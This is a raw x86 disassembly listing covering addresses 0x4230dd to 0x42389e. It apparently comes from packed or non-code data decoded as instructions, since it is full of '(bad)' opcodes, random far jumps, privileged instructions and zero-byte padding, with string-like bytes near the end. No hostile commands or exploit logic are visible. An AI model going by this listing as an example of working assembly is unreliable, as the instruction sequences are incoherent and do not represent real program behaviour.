  4230dd:	dec    eax
  4230de:	test   BYTE PTR ss:[edi+eax*1+0x1d65c],dl
  4230e6:	arpl   WORD PTR [eax],ax
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	mov    edx,es
  4230ec:	xchg   esi,eax
  4230ed:	sbb    DWORD PTR [esi-0x43f0840],edx
  4230f3:	push   ebp
  4230f4:	pop    es
  4230f5:	ror    eax,1
  4230f7:	fidiv  DWORD PTR [edi+0x3a5923d5]
  4230fd:	and    al,0x33
  4230ff:	add    edi,DWORD PTR [ecx+0x61]
  423102:	sub    al,0x46
  423104:	adc    BYTE PTR [ecx+ecx*4+0x1a522651],ch
  42310b:	(bad)  
  42310d:	cpuid  
  42310f:	lds    ebp,FWORD PTR [eax]
  423111:	xchg   DWORD PTR [edi-0x7d],ebp
  423114:	add    ebp,DWORD PTR [ecx]
  423116:	cmp    eax,0xf7da919c
  42311b:	imul   edx,esi,0xf44c47cb
  423121:	int3   
  423122:	push   ebx
  423123:	and    BYTE PTR [ebx+eiz*2-0x63],dh
  423127:	dec    ecx
  423128:	stos   DWORD PTR es:[edi],eax
  423129:	rcr    BYTE PTR [ebx-0x5db82b9b],1
  42312f:	(bad)  
  423130:	sti    
  423131:	shl    DWORD PTR [eax],0x6d
  423134:	cmc    
  423135:	xchg   edx,eax
  423136:	fsub   DWORD PTR [esi]
  423138:	or     esp,DWORD PTR ds:0xf86870f4
  42313e:	push   0x26
  423140:	add    al,0x37
  423142:	stos   DWORD PTR es:[edi],eax
  423143:	push   es
  423144:	mov    ds:0x9eae5874,al
  423149:	mov    eax,ds:0x13c30a
  42314e:	add    BYTE PTR [eax],al
  423150:	add    BYTE PTR [eax],al
  423152:	arpl   WORD PTR ss:[eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	push   es
  42315f:	dec    ebp
  423160:	outs   dx,DWORD PTR ds:[esi]
  423161:	dec    eax
  423162:	mov    edi,0x630001d6
  423167:	add    BYTE PTR [eax],al
  423169:	add    BYTE PTR [edi-0x76043301],dh
  42316f:	mov    ch,0x7c
  423171:	inc    esi
  423172:	sahf   
  423173:	int3   
  423174:	sbb    eax,0x6e3db9e6
  423179:	or     dh,BYTE PTR [esi-0x273b68c]
  42317f:	int    0xea
  423181:	pcmpeqw mm7,QWORD PTR [eax+0x16]
  423185:	jp     0x42318c
  423187:	popa   
  423188:	cmp    BYTE PTR [esi+0x601a4af2],bh
  42318e:	mov    ebp,0x720681f8
  423193:	aam    0xdd
  423195:	test   eax,0x2e9fc4d4
  42319a:	fdiv   st,st(1)
  42319c:	and    DWORD PTR [ecx+0x31],esp
  42319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231a0:	das    
  4231a1:	imul   eax,DWORD PTR [edx],0xe430e28
  4231a7:	ret    
  4231a8:	sub    al,0xc6
  4231aa:	dec    esi
  4231ab:	cdq    
  4231ac:	jl     0x42322b
  4231ae:	jae    0x4231d6
  4231b0:	xchg   cl,cl
  4231b2:	ins    DWORD PTR es:[edi],dx
  4231b3:	mov    dl,0x2b
  4231b5:	or     ebp,0x7a
  4231b8:	jmp    0x3bdf:0xbeb4d681
  4231bf:	adc    edx,DWORD PTR [eax-0x4a]
  4231c2:	mov    esp,0x7174e880
  4231c7:	xlat   BYTE PTR ds:[ebx]
  4231c8:	jno    0x423206
  4231ca:	inc    ebp
  4231cb:	and    ah,BYTE PTR [ecx+0x0]
  4231d1:	add    BYTE PTR [edi],ah
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	inc    esp
  4231df:	sub    dh,0x46
  4231e2:	sbb    dh,bl
  4231e4:	add    DWORD PTR [eax],eax
  4231e6:	arpl   WORD PTR [eax],ax
  4231e8:	add    BYTE PTR [eax],al
  4231ea:	inc    esp
  4231eb:	sub    DWORD PTR [ecx+edi*8+0x4f],0x80f2bb5f
  4231f3:	out    0x5f,eax
  4231f5:	lock (bad) 
  4231f8:	xor    ebp,DWORD PTR [ecx]
  4231fa:	cdq    
  4231fb:	mov    bl,0x4d
  4231fd:	frstor [ecx+0x1aef3928]
  423203:	cmp    ah,BYTE PTR [eax]
  423205:	xor    DWORD PTR [edx],esp
  423207:	jno    0x42325a
  423209:	xor    BYTE PTR [ebx+0x4406dc38],ah
  42320f:	(bad)  
  423210:	mov    eax,ds:0x10c1a08e
  423215:	lds    ebx,FWORD PTR [esp+edi*2]
  423218:	jns    0x4231b5
  42321a:	mov    WORD PTR [bp+di-0x54],gs
  42321e:	push   esi
  42321f:	hlt    
  423220:	or     eax,0xdebaacd6
  423225:	int3   
  423226:	jle    0x4232a5
  423228:	aaa    
  423229:	out    dx,eax
  42322a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42322b:	cmp    ecx,DWORD PTR [esp-0x35]
  42322f:	mov    WORD PTR [ebp+edx*2+0x108c554a],ss
  423236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423237:	outs   dx,DWORD PTR ds:[esi]
  423238:	js     0x423296
  42323a:	mov    esp,0xa400922a
  42323f:	add    al,0x45
  423241:	xchg   al,cl
  423243:	repnz dec ebx
  423245:	xor    edi,DWORD PTR [esi+0x73f044b2]
  42324b:	mov    bl,0x61
  42324d:	add    BYTE PTR [eax],al
  42324f:	add    BYTE PTR [eax],al
  423251:	add    BYTE PTR [edi],ah
  423253:	ss lahf 
  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0xcc40075b
  423260:	ror    DWORD PTR [esi+0x1de7b],0x63
  423267:	add    BYTE PTR [eax],al
  423269:	add    BYTE PTR [esi+0x7141f728],bl
  42326f:	mov    esp,0x2c74eb78
  423274:	xor    DWORD PTR [edi-0xa],ebp
  423277:	loop   0x42324e
  423279:	fcom   DWORD PTR [esp+eax*1+0x79]
  42327d:	add    DWORD PTR [ecx],esi
  42327f:	dec    edi
  423280:	dec    ebx
  423281:	les    edi,FWORD PTR [esi-0x7c]
  423284:	pop    ss
  423285:	add    esp,esi
  423287:	mov    edi,0x79ff94d7
  42328c:	jecxz  0x42328e
  42328e:	pop    ecx
  42328f:	or     DWORD PTR [edx],0x59d98c4f
  423295:	push   ecx
  423296:	leave  
  423297:	mov    al,0x18
  423299:	repnz add BYTE PTR [ecx-0x38db1f52],dl
  4232a0:	in     eax,0xc1
  4232a2:	scas   al,BYTE PTR es:[edi]
  4232a3:	or     al,BYTE PTR [ebp+0x6093ae2]
  4232a9:	int    0xfc
  4232ab:	dec    eax
  4232ac:	ror    DWORD PTR [eax+0x58],1
  4232af:	push   ss
  4232b0:	cld    
  4232b1:	pop    ebp
  4232b2:	rol    DWORD PTR [ebx],0x5f
  4232b5:	in     al,0x6b
  4232b7:	jmp    0x7b57:0x19bad6b2
  4232be:	aam    0x33
  4232c0:	add    BYTE PTR [edx+0x7adb8950],ah
  4232c6:	dec    edi
  4232c7:	icebp  
  4232c8:	fwait
  4232c9:	jne    0x423306
  4232cb:	ror    DWORD PTR [eax+eax*1+0x0],0x0
  4232d0:	add    BYTE PTR [eax],al
  4232d2:	aaa    
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0x97f3:0x282eeef4
  4232e2:	(bad)  
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	arpl   WORD PTR [eax],ax
  4232e8:	add    BYTE PTR [eax],al
  4232ea:	gs mov dh,0x7c
  4232ed:	fld    QWORD PTR [edi]
  4232ef:	xchg   ecx,eax
  4232f0:	std    
  4232f1:	ds mov esp,DWORD PTR cs:[ecx]
  4232f5:	lock stos WORD PTR es:[edi],ax
  4232f8:	mov    al,ds:0x14c1e017
  4232fd:	jp     0x423374
  4232ff:	call   0x888cb793
  423304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423305:	imul   esi,DWORD PTR [ebx],0x159c467
  42330b:	je     0x4232c1
  42330d:	scas   al,BYTE PTR es:[edi]
  42330e:	mov    BYTE PTR [esp+edi*1-0x1e985010],dl
  423315:	sbb    BYTE PTR [ebx+0x38],bl
  423318:	push   ebx
  423319:	iret   
  42331a:	push   es
  42331b:	add    DWORD PTR ds:0xd99ed844,ecx
  423321:	jmp    0xb3e0:0x1d150f61
  423328:	lock bnd ds ret 
  42332c:	adc    DWORD PTR [ebx-0x32],ebx
  42332f:	pop    ss
  423330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423331:	stos   BYTE PTR es:[edi],al
  423332:	xchg   ebx,eax
  423333:	push   ds
  423334:	fcom   DWORD PTR [edx]
  423336:	cmc    
  423337:	jle    0x42338e
  423339:	popf   
  42333a:	addr16 xchg edi,eax
  42333c:	cmp    BYTE PTR [edi+0x1a],dh
  42333f:	mov    ds:0x7195659,eax
  423344:	jbe    0x42333e
  423346:	pop    ds
  423347:	adc    DWORD PTR [edi+0x41c18f35],ebp
  42334d:	add    BYTE PTR [eax],al
  42334f:	add    BYTE PTR [eax],al
  423351:	add    BYTE PTR [esi],dl
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi+0x619a5f3a],al
  423360:	retf   
  423361:	aad    0x41
  423363:	fild   WORD PTR [ecx]
  423365:	add    BYTE PTR [ebx+0x0],ah
  423368:	add    BYTE PTR [eax],al
  42336a:	test   al,0xe
  42336c:	inc    esp
  42336d:	imul   eax,DWORD PTR [ecx+0x52],0x65
  423371:	push   cs
  423372:	mov    al,0x9
  423374:	mov    dl,bh
  423376:	and    bh,bh
  423378:	xchg   esi,eax
  423379:	push   esp
  42337a:	add    al,0x8c
  42337c:	mov    ds:0xaaf3ae26,eax
  423381:	adc    edi,ebp
  423383:	sbb    al,BYTE PTR [ebp-0x2a]
  423386:	sbb    al,0xdd
  423388:	and    al,0x70
  42338a:	inc    ebp
  42338b:	sbb    esi,DWORD PTR [ebx+edi*1]
  42338e:	jp     0x4233f0
  423390:	sti    
  423391:	pop    esp
  423392:	std    
  423393:	push   esp
  423394:	test   bh,dl
  423396:	jle    0x42334b
  423398:	mov    ds:0xb1a84924,al
  42339d:	pop    ecx
  42339e:	loop   0x4233e6
  4233a0:	mov    WORD PTR [ebp+0x4249c5f6],fs
  4233a6:	dec    esp
  4233a7:	in     eax,0x36
  4233a9:	imul   edx,DWORD PTR [ecx+0x2a],0xa5bc374
  4233b0:	(bad)  
  4233b1:	push   ss
  4233b2:	pusha  
  4233b3:	jno    0x423434
  4233b5:	mov    WORD PTR [ebx+0x44],ss
  4233b8:	or     dh,BYTE PTR [ecx-0x21]
  4233bb:	or     esp,DWORD PTR [edx]
  4233bd:	and    al,0x85
  4233bf:	pop    edx
  4233c0:	adc    BYTE PTR [eax],dh
  4233c2:	imul   esp,DWORD PTR [edi-0x59],0xf16d4d3c
  4233c9:	mov    edi,0xdf9257
  4233ce:	add    BYTE PTR [eax],al
  4233d0:	add    BYTE PTR [eax],al
  4233d2:	outs   dx,BYTE PTR ds:[esi]
  4233d3:	jbe    0x4233b9
  4233d5:	retf   0xdafc
  4233d8:	outs   dx,BYTE PTR ds:[esi]
  4233d9:	neg    BYTE PTR [eax]
  4233db:	xchg   edx,eax
  4233dc:	xchg   DWORD PTR [edi-0x2226c222],edx
  4233e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233e3:	fild   WORD PTR [ecx]
  4233e5:	add    BYTE PTR [ebx+0x0],ah
  4233e8:	add    BYTE PTR [eax],al
  4233ea:	loopne 0x4233dd
  4233ec:	pusha  
  4233ed:	cmp    eax,0x2b224dbc
  4233f2:	sub    DWORD PTR [edi+0x35],ebp
  4233f5:	pop    DWORD PTR [edi+0x7b]
  4233f8:	jg     0x423477
  4233fa:	aas    
  4233fb:	xchg   esi,eax
  4233fc:	jge    0x42338c
  4233fe:	pop    esp
  4233ff:	mov    esi,DWORD PTR [ebp-0x41]
  423402:	rcr    edx,cl
  423404:	neg    DWORD PTR [edi+0x54055f3]
  42340a:	jl     0x4233af
  42340c:	mov    BYTE PTR [edx-0x4c587239],ah
  423412:	iret   
  423413:	retf   
  423414:	cwde   
  423415:	inc    eax
  423416:	and    eax,0x403ca10f
  42341b:	stos   DWORD PTR es:[edi],eax
  42341c:	shl    BYTE PTR [ebp-0x26],cl
  42341f:	enter  0xb74e,0xde
  423423:	pusha  
  423424:	mov    esi,0x9ecffe6b
  423429:	mov    ebx,DWORD PTR [edi]
  42342b:	push   ecx
  42342c:	xor    al,0xd
  42342e:	adc    ecx,DWORD PTR [edi+0x73]
  423431:	in     eax,0x3c
  423433:	xchg   ecx,eax
  423434:	test   al,0x9d
  423436:	push   ds
  423437:	and    esi,DWORD PTR [edi+ebp*4]
  42343a:	arpl   WORD PTR [esi+ebp*8-0x23c317fd],dx
  423441:	pop    eax
  423442:	scas   eax,DWORD PTR es:[edi]
  423443:	arpl   WORD PTR [ebx],si
  423445:	push   0x5
  423447:	add    al,BYTE PTR [ecx+0x23853e5c]
  42344d:	add    BYTE PTR [eax],al
  42344f:	add    BYTE PTR [eax],al
  423451:	add    BYTE PTR [edx],bh
  423453:	push   edx
  423454:	les    ecx,FWORD PTR [edi]
  423456:	in     al,dx
  423457:	lahf   
  423458:	sti    
  423459:	ja     0x423451
  42345b:	rcl    DWORD PTR [eax+0x22aee5d3],1
  423461:	mov    al,BYTE PTR [edi]
  423463:	loopne 0x423466
  423465:	add    BYTE PTR [ebx+0x0],ah
  423468:	add    BYTE PTR [eax],al
  42346a:	inc    edi
  42346b:	mov    ebp,0x731890b4
  423470:	ss mov esi,0x8b28e719
  423476:	add    bh,0x83
  423479:	call   0xa6a5f776
  42347e:	xor    ah,dl
  423480:	pop    edx
  423481:	cmp    DWORD PTR [eax+0x6fa4f26b],edx
  423487:	shr    DWORD PTR [edi+0x1f],cl
  42348a:	(bad)  
  42348b:	scas   al,BYTE PTR es:[edi]
  42348c:	mul    BYTE PTR [edi+ebp*1+0x3d330300]
  423493:	fisttp DWORD PTR [edi+0x43]
  423496:	jecxz  0x42344a
  423498:	or     ch,BYTE PTR [edi-0x55]
  42349b:	pusha  
  42349c:	jecxz  0x42344f
  42349e:	mov    esp,0x4b4e0e3d
  4234a3:	pop    edi
  4234a4:	sbb    al,0x89
  4234a6:	retf   
  4234a7:	mov    ds:0x5360b284,eax
  4234ac:	repz mov esp,DWORD PTR [ebx-0x6f]
  4234b0:	leave  
  4234b1:	aaa    
  4234b2:	jbe    0x4234bb
  4234b4:	pop    esp
  4234b5:	dec    ecx
  4234b6:	adc    al,0x57
  4234b8:	cmp    dl,BYTE PTR [edi+ecx*8]
  4234bb:	sahf   
  4234bc:	and    dh,BYTE PTR [eax+0x7fc1c361]
  4234c2:	call   0xe56f:0x3572dc7a
  4234c9:	mov    ecx,0x896731
  4234ce:	add    BYTE PTR [eax],al
  4234d0:	add    BYTE PTR [eax],al
  4234d2:	xchg   ebx,eax
  4234d3:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4234da:	push   eax
  4234db:	loopne 0x4234d7
  4234dd:	call   0xe06a:0x869c5958
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	arpl   WORD PTR [eax],ax
  4234e8:	add    BYTE PTR [eax],al
  4234ea:	jecxz  0x423517
  4234ec:	mov    al,0xef
  4234ee:	dec    ecx
  4234ef:	shr    BYTE PTR [ecx-0x32027702],1
  4234f5:	into   
  4234f6:	fild   QWORD PTR [edi]
  4234f8:	cmc    
  4234f9:	mov    ebx,0x3e8907b2
  4234fe:	daa    
  4234ff:	pop    es
  423500:	jmp    0xaf23077d
  423505:	enter  0x4c5a,0x31
  423509:	ret    
  42350a:	inc    esp
  42350b:	addr16 or ecx,ebx
  42350e:	int3   
  42350f:	fisttp QWORD PTR [ebx+edi*8]
  423512:	jmp    0x519:0xcfc3466b
  423519:	and    cl,BYTE PTR [edx-0x41]
  42351c:	loope  0x42359b
  42351e:	xlat   BYTE PTR ds:[ebx]
  42351f:	push   ss
  423520:	shl    BYTE PTR [ecx-0x27935889],0xa2
  423527:	cdq    
  423528:	outs   dx,BYTE PTR ds:[si]
  42352a:	out    0xc5,eax
  42352c:	clc    
  42352d:	aas    
  42352e:	sar    BYTE PTR [ecx+0x77],0xb2
  423532:	cld    
  423533:	push   cs
  423534:	sbb    DWORD PTR ds:0x11e58776,edi
  42353a:	leave  
  42353b:	push   edi
  42353c:	jg     0x4235ae
  42353e:	imul   BYTE PTR [esi]
  423540:	xchg   BYTE PTR [edx-0x41],dl
  423543:	(bad)  
  423544:	cdq    
  423545:	ficom  DWORD PTR fs:[edx-0x3e]
  423549:	dec    eax
  42354a:	mov    dh,0x51
  42354c:	mov    ds:0x0,eax
  423551:	add    ah,bl
  423553:	fincstp 
  423555:	shl    bh,0xee
  423558:	(bad)  
  423559:	frstor [ecx+eax*1]
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	jp     0x423558
  423560:	and    BYTE PTR [esi-0x33],ah
  423563:	loopne 0x423566
  423565:	add    BYTE PTR [ebx+0x0],ah
  423568:	add    BYTE PTR [eax],al
  42356a:	aam    0xee
  42356c:	icebp  
  42356d:	icebp  
  42356e:	pusha  
  42356f:	clc    
  423570:	inc    esp
  423571:	pop    edi
  423572:	test   al,0x3
  423574:	fcomp  DWORD PTR [ebx+0x4d]
  423577:	push   DWORD PTR [ebp+0x3ef61fb4]
  42357d:	jl     0x4235fc
  42357f:	xor    BYTE PTR [edx],dh
  423581:	cmp    ebx,DWORD PTR [esi-0x6a]
  423584:	shl    DWORD PTR [edi-0xc498991],1
  42358a:	pop    ds
  42358b:	xchg   esi,eax
  42358c:	lahf   
  42358d:	mov    dl,0x71
  42358f:	jg     0x4235ce
  423591:	mov    dl,0x36
  423593:	push   edi
  423594:	sub    eax,0x939c964a
  423599:	loopne 0x42358a
  42359b:	ds inc ebp
  42359d:	sub    esi,DWORD PTR [ebx]
  42359f:	add    bl,ch
  4235a1:	gs jns 0x42360b
  4235a4:	adc    esi,edi
  4235a6:	iret   
  4235a7:	ins    DWORD PTR es:[edi],dx
  4235a8:	js     0x423594
  4235aa:	test   edx,0x4c101e96
  4235b0:	cmp    DWORD PTR [edi],esi
  4235b2:	and    ch,dh
  4235b4:	mul    BYTE PTR [eax]
  4235b6:	sub    al,0xc1
  4235b8:	je     0x42360b
  4235ba:	jp     0x423603
  4235bc:	xchg   edx,eax
  4235bd:	int3   
  4235be:	call   0x9b3b742
  4235c3:	mov    edi,0x72e34432
  4235c8:	mov    DWORD PTR [esi+0x76],ebp
  4235cb:	push   ebx
  4235cc:	ret    
  4235cd:	add    BYTE PTR [eax],al
  4235cf:	add    BYTE PTR [eax],al
  4235d1:	add    BYTE PTR [edi-0x5e],ch
  4235d4:	aam    0x2a
  4235d6:	fnstsw WORD PTR [esi-0x1]
  4235d9:	out    0x52,eax
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x6f
  4235df:	mov    esi,0xe130797e
  4235e4:	add    DWORD PTR [eax],eax
  4235e6:	arpl   WORD PTR [eax],ax
  4235e8:	add    BYTE PTR [eax],al
  4235ea:	or     eax,0x2fb31567
  4235ef:	jge    0x42362a
  4235f1:	push   edi
  4235f2:	cmp    bl,BYTE PTR [edx+0x5a2f3f71]
  4235f8:	mov    bl,0x48
  4235fa:	inc    edx
  4235fb:	pusha  
  4235fc:	sub    eax,0x9086e846
  423601:	and    al,0x96
  423603:	fistp  DWORD PTR [ecx]
  423605:	cmp    eax,0x5b6422bd
  42360a:	sub    DWORD PTR [esi+0x4af089e2],esp
  423610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423611:	push   0xc7f94b8f
  423616:	and    bl,BYTE PTR ds:0xfade088f
  42361c:	int3   
  42361d:	imul   edx,DWORD PTR [ecx],0xffffffa5
  423620:	ret    0x421c
  423623:	mov    bh,0x9a
  423625:	or     al,0x6
  423627:	mov    dl,BYTE PTR [ebp+edi*8+0x62]
  42362b:	cwde   
  42362c:	arpl   WORD PTR ds:0x4ce04067,bp
  423632:	gs pop ecx
  423634:	push   0x8b3e14b1
  423639:	jecxz  0x42369c
  42363b:	out    0x67,al
  42363d:	cwde   
  42363e:	sahf   
  42363f:	inc    edi
  423640:	jg     0x4236ac
  423642:	repz jno 0x423693
  423645:	jb     0x42368e
  423647:	mov    esi,0x18cd5b17
  42364c:	into   
  42364d:	add    BYTE PTR [eax],al
  42364f:	add    BYTE PTR [eax],al
  423651:	add    cl,bh
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	sub    eax,0x932bc6c9
  423663:	loope  0x423666
  423665:	add    BYTE PTR [ebx+0x0],ah
  423668:	add    BYTE PTR [eax],al
  42366a:	push   ss
  42366b:	arpl   WORD PTR [ebx-0x907437b],si
  423671:	push   es
  423672:	stc    
  423673:	out    0x9,eax
  423675:	mov    ch,0xf2
  423677:	fucomp st(3)
  423679:	mov    al,BYTE PTR [eax+0x58]
  42367c:	cli    
  42367d:	sub    al,0xef
  42367f:	jge    0x42368b
  423681:	repnz mov ch,0xa8
  423684:	mov    BYTE PTR [esi],bl
  423686:	or     al,0xc
  423688:	pop    ds
  423689:	xchg   ecx,eax
  42368a:	dec    edx
  42368c:	(bad)  
  42368d:	aam    0x61
  42368f:	cdq    
  423690:	jno    0x4236f2
  423692:	fst    QWORD PTR [edi]
  423694:	add    cl,dh
  423696:	jbe    0x42361c
  423698:	lock lods eax,DWORD PTR ds:[esi]
  42369a:	jg     0x4236b3
  42369c:	cmp    al,0x1a
  42369e:	jmp    0x5604:0x9d70005f
  4236a5:	ds test al,0xc6
  4236a8:	push   cs
  4236a9:	pop    ds
  4236aa:	call   0x83af:0x62fa8236
  4236b1:	loop   0x423693
  4236b3:	call   0xac7d:0x54118505
  4236ba:	mov    dl,0x32
  4236bc:	xor    al,0x86
  4236be:	out    0xeb,al
  4236c0:	pop    ecx
  4236c1:	pushf  
  4236c2:	call   0xf1c1c8d8
  4236c7:	pop    es
  4236c8:	icebp  
  4236c9:	ja     0x423679
  4236cb:	stc    
  4236cc:	retf   0x0
  4236cf:	add    BYTE PTR [eax],al
  4236d1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0xb34f8c27
  4236e0:	ds shl dh,cl
  4236e3:	loope  0x4236e6
  4236e5:	add    BYTE PTR [ebx+0x0],ah
  4236e8:	add    BYTE PTR [eax],al
  4236ea:	mov    esi,0x3beb55d8
  4236ef:	ret    0xcae6
  4236f2:	mov    bh,0x84
  4236f4:	psrlq  mm6,QWORD PTR [edx+0x77]
  4236f8:	cmp    BYTE PTR [esi],0x29
  4236fb:	(bad)
  4236ff:	or     al,BYTE PTR [ebp-0x28]
  423702:	icebp  
  423703:	ret    0x9fd8
  423706:	inc    esp
  423707:	mov    ah,0xef
  423709:	aas    
  42370a:	mov    al,ds:0xa73d7e89
  42370f:	ss pop ebx
  423711:	cwde   
  423712:	cmp    eax,DWORD PTR ds:[esp+eax*2-0x3660bbb4]
  42371a:	push   ebx
  42371b:	xor    eax,0x58d0447f
  423720:	xor    esp,DWORD PTR [eax]
  423722:	dec    ebp
  423723:	in     eax,0xe0
  423725:	lea    eax,[ecx+ebp*1+0x2b054fc7]
  42372c:	jne    0x423732
  42372e:	mov    ?,WORD PTR [ecx-0xf]
  423731:	lea    esp,[edx+0x757d327d]
  423737:	xor    edx,DWORD PTR [ecx-0x37]
  42373a:	mov    esp,0x3a3e0d58
  42373f:	push   eax
  423740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423741:	pop    eax
  423742:	push   cs
  423743:	adc    eax,ecx
  423745:	xor    BYTE PTR [edi],dh
  423747:	stc    
  423748:	add    BYTE PTR [edx+0x43bedb],ah
  42374e:	add    BYTE PTR [eax],al
  423750:	add    BYTE PTR [eax],al
  423752:	adc    dl,bh
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	inc    edx
  42375f:	dec    esi
  423760:	push   ebx
  423761:	or     bl,BYTE PTR [ecx-0x1e]
  423764:	add    DWORD PTR [eax],eax
  423766:	arpl   WORD PTR [eax],ax
  423768:	add    BYTE PTR [eax],al
  42376a:	mov    edx,0xc5506020
  42376f:	nop
  423770:	cmp    eax,0x390c4a59
  423775:	sub    al,0x2a
  423777:	(bad)  
  423778:	mov    ecx,0xb24e5900
  42377d:	pop    eax
  42377e:	dec    DWORD PTR [ebp+0x4b]
  423781:	rcl    DWORD PTR [edx-0x3cb5f1ff],1
  423787:	xchg   esp,eax
  423788:	(bad)  
  423789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42378a:	into   
  42378b:	shl    BYTE PTR [eax-0x3c],1
  42378e:	xchg   ebx,eax
  42378f:	repnz mov esp,DWORD PTR gs:[edx]
  423793:	adc    DWORD PTR ds:0x3bcdd848,ecx
  423799:	dec    esp
  42379a:	fdiv   QWORD PTR [edi+0x4cb9f450]
  4237a0:	shl    esi,1
  4237a2:	jbe    0x42375e
  4237a4:	(bad)  
  4237a6:	jp     0x4237b9
  4237a8:	mov    edi,0xcd1c11c2
  4237ad:	pop    ds
  4237ae:	jbe    0x4237d2
  4237b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b1:	xor    DWORD PTR [ebx-0x6162a2ee],esi
  4237b7:	add    esi,DWORD PTR ds:0x846c919b
  4237bd:	daa    
  4237be:	dec    ecx
  4237bf:	dec    ebx
  4237c0:	push   ebx
  4237c1:	xor    BYTE PTR [edi-0x1cee2cc8],ch
  4237c7:	loopne 0x423799
  4237c9:	fdivr  DWORD PTR [ecx+0xaf22]
  4237cf:	add    BYTE PTR [eax],al
  4237d1:	add    BYTE PTR [eax],al
  4237d3:	rol    BYTE PTR [edx+0x0],0x4
  4237d7:	rol    BYTE PTR [edx+0x0],0x8
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
